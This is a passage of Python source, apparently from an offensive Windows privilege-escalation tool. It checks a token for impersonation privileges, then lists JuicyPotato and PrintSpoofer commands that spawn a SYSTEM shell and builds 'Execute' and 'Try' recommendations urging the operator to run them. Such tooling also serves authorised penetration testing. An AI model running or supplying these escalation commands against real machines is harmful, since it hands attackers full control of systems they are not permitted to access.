                    # Add to Potato attacks if applicable
                    if priv_name in ["SeImpersonatePrivilege", "SeAssignPrimaryTokenPrivilege"]:
                        results["potato_attacks"].append(
                            {
                                "name": "JuicyPotato",
                                "command": "JuicyPotato.exe -l 1337 -p cmd.exe -t * -c {CLSID}",
                                "description": "Token manipulation for SYSTEM shell",
                            }
                        )
                        results["potato_attacks"].append(
                            {
                                "name": "PrintSpoofer",
                                "command": "PrintSpoofer.exe -i -c cmd",
                                "description": "Exploit Print Spooler service (Windows 10/Server 2019)",
                            }
                        )

        # Generate recommendations
        if results["dangerous_privileges"]:
            # Sort by severity
            critical = [p for p in results["dangerous_privileges"] if p["severity"] == "CRITICAL"]

            if critical:
                results["recommendations"].append(
                    f"[CRITICAL] Found {len(critical)} critical privilege(s): {', '.join([p['name'] for p in critical])}"
                )
                results["recommendations"].append(f"Recommended: {critical[0]['exploit_method']}")
                results["recommendations"].append(f"Execute: {critical[0]['commands'][0]}")

            if results["potato_attacks"]:
                results["recommendations"].append(
                    f"Potato attacks available - {len(results['potato_attacks'])} variants"
                )
                results["recommendations"].append(f"Try: {results['potato_attacks'][0]['command']}")
        else:
            results["recommendations"].append(
                "No dangerous privileges found - current user has limited token privileges"
            )

        results["success"] = True

    except Exception as e:
        results["error"] = str(e)

    return results
